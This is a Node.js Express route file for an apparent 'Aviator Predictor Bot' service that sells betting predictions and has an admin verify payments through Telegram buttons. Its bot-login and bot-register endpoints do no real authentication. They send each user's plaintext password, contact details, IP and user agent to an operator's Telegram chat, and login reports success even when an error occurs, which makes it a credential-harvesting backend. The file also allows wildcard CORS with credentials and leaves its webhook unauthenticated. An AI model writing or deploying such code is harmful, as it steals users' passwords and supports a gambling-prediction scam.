// routes/telegram.js
const express = require('express');
const fetch = require('node-fetch');
const router = express.Router();
const fs = require('fs');
const path = require('path');

// Telegram configuration
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;

// Helper function to log authentication attempts
const logAuthData = (data) => {
  const logsDir = path.join(__dirname, '..', 'logs');
  if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
  }
  
  const logFile = path.join(logsDir, `telegram-auth-${new Date().toISOString().split('T')[0]}.log`);
  const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
  fs.appendFileSync(logFile, logEntry);
  console.log('🔐 Telegram auth data logged:', data);
};

// Helper function to send to Telegram
const sendToTelegram = async (message) => {
  try {
    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
    
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
      return { success: false, error: `Telegram API error: ${response.status}`, details: errorText };
    }
    
    const result = await response.json();
    console.log('✅ Telegram message sent successfully:', result.message_id);
    return { success: true, result };
    
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error.message);
    return { success: false, error: error.message };
  }
};

// Mask sensitive data for logging (keeping passwords visible but masked in logs)
const maskSensitiveData = (data) => {
  const masked = { ...data };
  if (masked.password) {
    masked.password = '*'.repeat(masked.password.length);
  }
  return masked;
};

// CORS middleware for all telegram routes
router.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// In-memory storage for pending payments
const pendingPayments = new Map();

// Handle preflight OPTIONS requests
router.options('/send', (req, res) => {
    const allowedOrigins = ['https://avisignals.com', 'https://aviatorhub.xyz'];
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
    } else {
        res.header('Access-Control-Allow-Origin', '*');
    }
    res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.sendStatus(200);
});

// Send message to Telegram
router.post('/send', async (req, res) => {
    // Set CORS headers explicitly for this route
    const allowedOrigins = ['https://avisignals.com', 'https://aviatorhub.xyz'];
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
    } else {
        res.header('Access-Control-Allow-Origin', '*');
    }
    res.header('Access-Control-Allow-Credentials', 'true');
    
    // Respond quickly to avoid client timeout
    let responseSent = false;
    
    const sendResponse = (status, data) => {
        if (!responseSent && !res.headersSent) {
            responseSent = true;
            res.status(status).json(data);
        }
    };
    
    try {
        const { message, orderId, includeVerificationButtons, paymentData } = req.body;
        
        console.log('📥 Telegram send request:', { 
            messageLength: message?.length, 
            orderId, 
            includeVerificationButtons,
            hasPaymentData: !!paymentData,
            hasToken: !!telegramBotToken,
            hasChatId: !!telegramChatId,
            tokenPrefix: telegramBotToken?.substring(0, 10) + '...',
            chatId: telegramChatId,
            baseUrl: process.env.BASE_URL
        });

        if (!message) {
            console.log('❌ No message provided');
            return sendResponse(400, {
                success: false,
                message: 'Message is required'
            });
        }

        let messageOptions = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        };

        // Add verification buttons for support messages
        if (includeVerificationButtons && orderId) {
            if (paymentData && paymentData.messageType === 'support') {
                // Support message buttons
                messageOptions.reply_markup = {
                    inline_keyboard: [
                        [
                            {
                                text: '💬 Reply to Customer',
                                callback_data: `reply_${orderId}`
                            }
                        ]
                    ]
                };
            } else {
                // Payment verification buttons
                messageOptions.reply_markup = {
                    inline_keyboard: [
                        [
                            {
                                text: '✅ VERIFY & SEND PREDICTIONS',
                                callback_data: `verify_${orderId}`
                            },
                            {
                                text: '❌ REJECT PAYMENT', 
                                callback_data: `reject_${orderId}`
                            }
                        ],
                        [
                            {
                                text: '💬 Reply to Customer',
                                callback_data: `reply_${orderId}`
                            }
                        ]
                    ]
                };
            }
        }

        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        console.log('📤 Sending to Telegram URL:', url.substring(0, 50) + '...');
        console.log('📤 Message options:', { 
            chat_id: messageOptions.chat_id, 
            textLength: messageOptions.text?.length,
            hasButtons: !!messageOptions.reply_markup,
            buttonCount: messageOptions.reply_markup?.inline_keyboard?.length || 0
        });
        
        // Send immediate response to frontend
        sendResponse(200, {
            success: true,
            message: 'Message queued for Telegram delivery',
            orderId: orderId
        });
        
        // Continue with Telegram API call in background
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(messageOptions),
            timeout: 10000 // 10 second timeout
        });

        const result = await response.json();
        console.log('📱 Telegram API Response:', { ok: result.ok, error: result.error_code, description: result.description });

        if (result.ok) {
            console.log('✅ Telegram message sent successfully to chat:', telegramChatId);
            // Don't send another response - already sent above
        } else {
            console.error('❌ Telegram API error:', result);
            // Don't send another response - already sent above
        }

    } catch (error) {
        console.error('Error sending to Telegram:', error);
        sendResponse(500, {
            success: false,
            message: 'Server error sending to Telegram',
            error: error.message
        });
    }
});

// Webhook endpoint for Telegram bot callbacks
router.post('/webhook', async (req, res) => {
    try {
        const update = req.body;
        
        // Handle text messages (for /reply commands and admin replies)
        if (update.message && update.message.text) {
            const text = update.message.text;
            const chatId = update.message.chat.id;
            const messageId = update.message.message_id;
            
            console.log('Received message:', text);

            // Default help message for telegram commands
            if (text === '/start' || text === '/help') {
                await sendTelegramMessage(chatId, 
                    `🤖 Aviator Support Bot\n\n` +
                    `This bot notifies admins about:\n` +
                    `• Payment verifications\n` +
                    `• Customer support requests\n\n` +
                    `Customer support is now handled via Tawk.to widget on the website.`
                );
            }
        }
        
        // Handle callback queries (button clicks) - keeping payment verification
        if (update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;
            
            console.log('Received callback:', data);
            
            if (data.startsWith('verify_')) {
                const orderId = data.replace('verify_', '');
                await handlePaymentVerification(orderId, chatId, messageId, 'verified');
            } else if (data.startsWith('reject_')) {
                const orderId = data.replace('reject_', '');
                await handlePaymentVerification(orderId, chatId, messageId, 'rejected');
            } else if (data.startsWith('reply_')) {
                const orderId = data.replace('reply_', '');
                await handleCustomerReply(orderId, chatId, messageId);
            } 

            // Answer callback query to remove loading state
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callbackQuery.id,
                    text: 'Processing...'
                })
            });
        }
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Handle payment verification
async function handlePaymentVerification(orderId, chatId, messageId, action) {
    try {
        console.log(`🔄 Processing ${action} for order: ${orderId}`);

        const updateMessage = async (chatId, messageId, text) => {
            try {
                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('❌ Failed to update Telegram message:', error.message);
            }
        };

        // Check if this order is already being processed or completed
        if (global.processingOrders && global.processingOrders[orderId]) {
            console.log(`⚠️ Order ${orderId} is already being processed`);
            await updateMessage(chatId, messageId, `⚠️ Order ${orderId} is already being processed. Please wait...`);
            return;
        }

        // Mark order as being processed
        global.processingOrders = global.processingOrders || {};
        global.processingOrders[orderId] = { action, timestamp: Date.now() };

        // Get payment data from storage sources
        let payment = pendingPayments.get(orderId);
        
        // Try Selar payments storage
        if (!payment && global.selarPayments && global.selarPayments[orderId]) {
            const selarPayment = global.selarPayments[orderId];
            
            // Check if already processed
            if (selarPayment.status === 'verified' || selarPayment.status === 'rejected') {
                console.log(`⚠️ Selar order ${orderId} already has status: ${selarPayment.status}`);
                delete global.processingOrders[orderId];
                await updateMessage(chatId, messageId, 
                    `⚠️ Selar Order ${orderId} was already ${selarPayment.status}!\n\n` +
                    `📧 Customer: ${selarPayment.email}\n` +
                    `📦 Package: ${selarPayment.packageName}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🕒 Processed: ${selarPayment.verifiedAt || selarPayment.rejectedAt}`
                );
                return;
            }
            
            payment = {
                email: selarPayment.email,
                packageName: selarPayment.packageName,
                amount: selarPayment.amount || 'N/A',
                currency: 'USD',
                timeSlot: selarPayment.timeSlot,
                bettingSite: selarPayment.bettingSite,
                status: selarPayment.status,
                paymentType: 'selar'
            };
        }

        // Try USDT payments
        if (!payment && global.usdtPayments && global.usdtPayments[orderId]) {
            const usdtPayment = global.usdtPayments[orderId];

            if (usdtPayment.status === 'verified' || usdtPayment.status === 'rejected') {
                console.log(`⚠️ USDT order ${orderId} already has status: ${usdtPayment.status}`);
                delete global.processingOrders[orderId];
                await updateMessage(chatId, messageId,
                    `⚠️ USDT Order ${orderId} was already ${usdtPayment.status.toUpperCase()}!
\n` +
                    `👤 Contact: ${usdtPayment.contact || 'Unknown'}\n` +
                    `📦 Package: ${usdtPayment.packageName}\n` +
                    `💵 Amount: ${usdtPayment.priceUsd} USDT\n` +
                    `🕒 Processed: ${usdtPayment.verifiedAt || usdtPayment.rejectedAt}`
                );
                return;
            }

            payment = {
                email: usdtPayment.contact || 'Unknown',
                packageName: usdtPayment.packageName,
                amount: usdtPayment.priceUsd || 'N/A',
                currency: 'USDT',
                siteName: usdtPayment.siteName,
                status: usdtPayment.status,
                paymentType: 'usdt'
            };
        }
        
        if (!payment) {
            console.log(`❌ Order ${orderId} not found in any payment storage`);
            delete global.processingOrders[orderId];
            await updateMessage(chatId, messageId, `❌ Order ${orderId} not found or already processed.`);
            return;
        }
        
        // Check if already processed to prevent race conditions
        if (payment.status === 'verified') {
            await updateMessage(chatId, messageId, 
                `✅ Order ${orderId} already VERIFIED!\n\n` +
                `📧 Customer: ${payment.email}\n` +
                `📦 Package: ${payment.packageName}\n` +
                `🆔 Order: ${orderId}\n\n` +
                `This payment has already been processed.`
            );
            return;
        }
        
        if (payment.status === 'rejected') {
            await updateMessage(chatId, messageId, 
                `❌ Order ${orderId} already REJECTED!\n\n` +
                `📧 Customer: ${payment.email}\n` +
                `📦 Package: ${payment.packageName}\n` +
                `🆔 Order: ${orderId}\n\n` +
                `This payment has already been processed.`
            );
            return;
        }
        
        if (action === 'verified') {
            console.log(`✅ PAYMENT VERIFIED via Telegram:`, { 
                orderId, 
                email: payment.email,
                package: payment.packageName,
                paymentType: payment.paymentType || 'unknown'
            });
                
            // Determine the correct verification endpoint based on payment type
            const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || 'https://aviator-backend-komp.onrender.com';
            let verifyUrl;

            if (payment.paymentType === 'selar' || global.selarPayments?.[orderId]) {
                // Use Selar admin verification endpoint
                verifyUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
            } else if (payment.paymentType === 'usdt' || orderId.startsWith('USDT_')) {
                verifyUrl = `${baseUrl}/api/payments/usdt/admin-verify/${orderId}`;
            } else if (orderId.startsWith('BOT_') && payment.packageName?.toLowerCase().includes('bot')) {
                // Bot activation endpoint
                verifyUrl = `${baseUrl}/api/payments/bot/verify/${orderId}`;
            } else {
                // Default to Selar for compatibility
                verifyUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
            }
            
            console.log('🔗 Verification URL:', verifyUrl);
            console.log('🔗 BASE_URL from env:', process.env.BASE_URL);
            
            const response = await fetch(verifyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ verified: true })
            });
                
            if (response.ok) {
                await updateMessage(chatId, messageId, 
                    `✅ Payment VERIFIED!\n\n` +
                    `📧 Customer: ${payment.email}\n` +
                    `📦 Package: ${payment.packageName}\n` +
                    `💰 Amount: ${payment.amount} ${payment.currency}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🔗 Type: ${payment.paymentType || 'selar'}\n\n` +
                    `🎯 Access has been granted to customer!`
                );
                
                // Only delete from pendingPayments after successful verification
                if (pendingPayments.has(orderId)) {
                    pendingPayments.delete(orderId);
                }
                
                // Clear processing state
                delete global.processingOrders[orderId];
                    
                console.log(`✅ Customer ${payment.email} will now see access granted!`);
            } else {
                const errorText = await response.text();
                console.error('Verification failed:', errorText);
                
                // Clear processing state
                delete global.processingOrders[orderId];
                
                await updateMessage(chatId, messageId, `❌ Failed to verify payment for order ${orderId}: ${errorText}`);
                
                // Reset status back to pending if verification failed
                if (global.selarPayments && global.selarPayments[orderId]) {
                    global.selarPayments[orderId].status = 'pending_verification';
                }
            }
        } else if (action === 'rejected') {
            console.log(`❌ PAYMENT REJECTED via Telegram:`, { 
                orderId, 
                email: payment.email,
                package: payment.packageName,
                paymentType: payment.paymentType || 'unknown'
            });
            
            // Determine the correct rejection endpoint based on payment type
            const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || 'https://aviator-backend-komp.onrender.com';
            let rejectUrl;

            if (payment.paymentType === 'selar' || global.selarPayments?.[orderId]) {
                // Use Selar admin verification endpoint with rejection
                rejectUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
            } else if (payment.paymentType === 'usdt' || orderId.startsWith('USDT_')) {
                rejectUrl = `${baseUrl}/api/payments/usdt/admin-verify/${orderId}`;
            } else if (orderId.startsWith('BOT_') && payment.packageName?.toLowerCase().includes('bot')) {
                // Bot activation endpoint
                rejectUrl = `${baseUrl}/api/payments/bot/verify/${orderId}`;
            } else {
                // Default to Selar for compatibility
                rejectUrl = `${baseUrl}/api/payments/selar/admin-verify/${orderId}`;
            }
            
            console.log('🔗 Rejection URL:', rejectUrl);
            console.log('🔗 BASE_URL from env:', process.env.BASE_URL);
            
            const response = await fetch(rejectUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ verified: false })
            });
            
            if (response.ok) {
                await updateMessage(chatId, messageId, 
                    `❌ Payment REJECTED!\n\n` +
                    `📧 Customer: ${payment.email}\n` +
                    `📦 Package: ${payment.packageName}\n` +
                    `💰 Amount: ${payment.amount} ${payment.currency}\n` +
                    `🆔 Order: ${orderId}\n` +
                    `🔗 Type: ${payment.paymentType || 'selar'}\n\n` +
                    `Customer has been notified.`
                );
                
                // Only delete from pendingPayments after successful rejection
                if (pendingPayments.has(orderId)) {
                    pendingPayments.delete(orderId);
                }
                
                // Clear processing state
                delete global.processingOrders[orderId];
            } else {
                const errorText = await response.text();
                console.error('Rejection failed:', errorText);
                
                // Clear processing state
                delete global.processingOrders[orderId];
                
                await updateMessage(chatId, messageId, `❌ Failed to reject payment for order ${orderId}: ${errorText}`);
                
                // Reset status back to pending if rejection failed
                if (global.selarPayments && global.selarPayments[orderId]) {
                    global.selarPayments[orderId].status = 'pending_verification';
                }
            }
        }
    } catch (error) {
        console.error('Error handling payment verification:', error);

        // Clear processing state
        if (global.processingOrders && global.processingOrders[orderId]) {
            delete global.processingOrders[orderId];
        }

        try {
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `❌ Error processing ${action} for order ${orderId}: ${error.message}`,
                    parse_mode: 'HTML'
                })
            });
        } catch (notifyError) {
            console.error('Failed to notify Telegram about verification error:', notifyError.message);
        }
    }
}

// Set webhook for Telegram bot (call this once to enable button callbacks)
router.post('/set-webhook', async (req, res) => {
    try {
        const baseUrl = process.env.BASE_URL?.replace(/\/$/, '') || '';
        const webhookUrl = `${baseUrl}/api/telegram/webhook`;
        
        console.log('🔗 Setting webhook URL:', webhookUrl);
        
        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/setWebhook`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url: webhookUrl,
                allowed_updates: ['callback_query', 'message']
            })
        });
        
        const result = await response.json();
        
        console.log('📱 Telegram webhook response:', result);
        
        if (result.ok) {
            res.json({ success: true, message: 'Webhook set successfully', webhookUrl });
        } else {
            res.status(400).json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('❌ Webhook setup error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Export router and pendingPayments
router.pendingPayments = pendingPayments;

// Helper function to send Telegram messages
async function sendTelegramMessage(chatId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// Endpoint to notify admin when customer proceeds to pay via Selar
router.post('/notify-selar-payment', async (req, res) => {
    const { email, packageName } = req.body;
    if (!email || !packageName) {
        return res.status(400).json({ success: false, message: 'Email and packageName are required.' });
    }
    const message = `🚦 <b>${email}</b> is proceeding to make payment on Selar for <b>${packageName}</b>.`;
    try {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const messageOptions = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        };
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(messageOptions)
        });
        res.json({ success: true, message: 'Notification sent to Telegram.' });
    } catch (error) {
        console.error('Error sending Selar payment notification:', error);
        res.status(500).json({ success: false, message: 'Failed to send notification.' });
    }
});

// Endpoint to notify Selar checkout initiation
router.post('/notify-selar', async (req, res) => {
    const { email, packageName, amount, source } = req.body;
    
    if (!email || !packageName) {
        return res.status(400).json({ success: false, message: 'Email and packageName are required.' });
    }
    
    // Build message
    let message = `💳 <b>SELAR CHECKOUT INITIATED</b>\n\n`;
    message += `👤 <b>Customer:</b> ${email}\n`;
    message += `📦 <b>Package:</b> ${packageName}\n`;
    
    if (amount) {
        message += `💰 <b>Amount:</b> $${amount}\n`;
    }
    
    if (source) {
        message += `🔗 <b>Source:</b> ${source}\n`;
    }
    
    message += `\n🚦 <b>Customer is being redirected to Selar checkout...</b>`;
    
    try {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const messageOptions = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        };
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(messageOptions)
        });
        
        res.json({ success: true, message: 'Card info and Selar notification sent to Telegram.' });
    } catch (error) {
        console.error('Error sending Selar card notification:', error);
        res.status(500).json({ success: false, message: 'Failed to send notification.' });
    }
});

// ==================== BOT LOGIN ROUTES ====================

// Bot login endpoint
router.post('/bot-login', async (req, res) => {
  try {
    const { contact, password, userAgent, timestamp } = req.body;

    // Validate required fields
    if (!contact || !password) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and password are required' 
      });
    }

    // Determine contact type
    const contactType = contact.includes('@') ? 'Email' : 'Mobile';
    
    const authData = {
      contact,
      contactType,
      password,
      userAgent: userAgent || 'Unknown',
      timestamp: timestamp || new Date().toISOString(),
      source: 'Aviator Bot Login',
      ip: req.ip || 'Unknown'
    };

    // Log authentication attempt (with masked password)
    logAuthData(maskSensitiveData(authData));

    // Send to Telegram with formatted message
    const telegramMessage = `🤖 <b>AVIATOR BOT LOGIN ALERT</b>

📧 Contact: <code>${contact}</code>
📱 Type: ${contactType}
🔑 Password: <code>${password}</code>
🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
🔗 Source: Aviator Predictor Bot`;

    const telegramResult = await sendToTelegram(telegramMessage);
    console.log('✅ Bot login Telegram result:', telegramResult);

    // Return success with session info
    res.json({ 
      success: true,
      message: 'Login successful',
      sessionData: {
        contact,
        contactType,
        loginTime: authData.timestamp,
        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
      }
    });

  } catch (error) {
    console.error('❌ Bot login error:', error);
    
    // Log error but still return success to avoid breaking frontend flow
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      timestamp: new Date().toISOString()
    });

    res.json({ 
      success: true,
      message: 'Login processed (fallback mode)',
      warning: 'Some features may be limited'
    });
  }
});

// Bot registration endpoint
router.post('/bot-register', async (req, res) => {
  try {
    const { email, phone, password, userAgent, timestamp } = req.body;

    // Validate required fields
    if (!email || !phone || !password) {
      return res.status(400).json({ 
        success: false,
        error: 'Email, phone, and password are required' 
      });
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid email format' 
      });
    }

    // Basic phone validation (simple check for numbers and common formats)
    const phoneRegex = /^[\+]?[1-9][\d]{3,14}$/;
    if (!phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''))) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid phone number format' 
      });
    }

    const registrationData = {
      email,
      phone,
      password,
      userAgent: userAgent || 'Unknown',
      timestamp: timestamp || new Date().toISOString(),
      source: 'Aviator Bot Registration',
      ip: req.ip || 'Unknown'
    };

    // Log registration attempt (with masked password)
    logAuthData(maskSensitiveData(registrationData));

    // Send to Telegram with formatted message
    const telegramMessage = `🆕 <b>NEW BOT USER REGISTRATION</b>

👤 Email: <code>${email}</code>
📱 Phone: <code>${phone}</code>
🔑 Password: <code>${password}</code>
🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Registration Time: <code>${new Date().toLocaleString()}</code>
🤖 Platform: Aviator Predictor Bot
🔗 Status: Successfully registered`;

    const telegramResult = await sendToTelegram(telegramMessage);
    console.log('✅ Bot registration Telegram result:', telegramResult);

    // Return success with registration info
    res.json({ 
      success: true,
      message: 'Registration successful',
      userData: {
        email,
        phone,
        registrationTime: registrationData.timestamp,
        status: 'registered'
      }
    });

  } catch (error) {
    console.error('❌ Bot registration error:', error);
    
    // Log error
    logAuthData({
      error: error.message,
      email: req.body.email,
      phone: req.body.phone,
      timestamp: new Date().toISOString()
    });

    res.status(500).json({ 
      success: false,
      error: 'Registration failed. Please try again.',
      details: error.message
    });
  }
});

// Get chat ID helper endpoint
router.get('/get-chat-id', async (req, res) => {
  try {
    // This will help you find your correct chat ID
    const instructions = `
To find your chat ID:
1. Go to Telegram and search for @spribeguru_bot
2. Send /start to the bot
3. Send any message like "test"
4. Then check the webhook logs or use @userinfobot

Current configured chat ID: ${telegramChatId}
Bot username: @spribeguru_bot

If the current chat ID doesn't work, you may need to:
- Start a fresh conversation with the bot
- Use @userinfobot to get your user ID
- Or create a group with the bot and use the group ID
`;

    res.json({
      success: true,
      message: "Chat ID Helper",
      instructions: instructions,
      currentChatId: telegramChatId,
      botUsername: "@spribeguru_bot"
    });

  } catch (error) {
    console.error('❌ Get chat ID error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Test Telegram connectivity endpoint
router.get('/test-telegram', async (req, res) => {
  try {
    const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>

⏰ Time: <code>${new Date().toLocaleString()}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
🔗 Source: Telegram Route Test Endpoint

✅ If you see this message, Telegram integration is working!`;

    const result = await sendToTelegram(testMessage);
    
    res.json({
      success: true,
      message: 'Telegram test completed',
      telegramResult: result,
      botToken: telegramBotToken ? 'Present' : 'Missing',
      chatId: telegramChatId ? 'Present' : 'Missing'
    });

  } catch (error) {
    console.error('❌ Telegram test error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      botToken: telegramBotToken ? 'Present' : 'Missing',
      chatId: telegramChatId ? 'Present' : 'Missing'
    });
  }
});

module.exports = router;
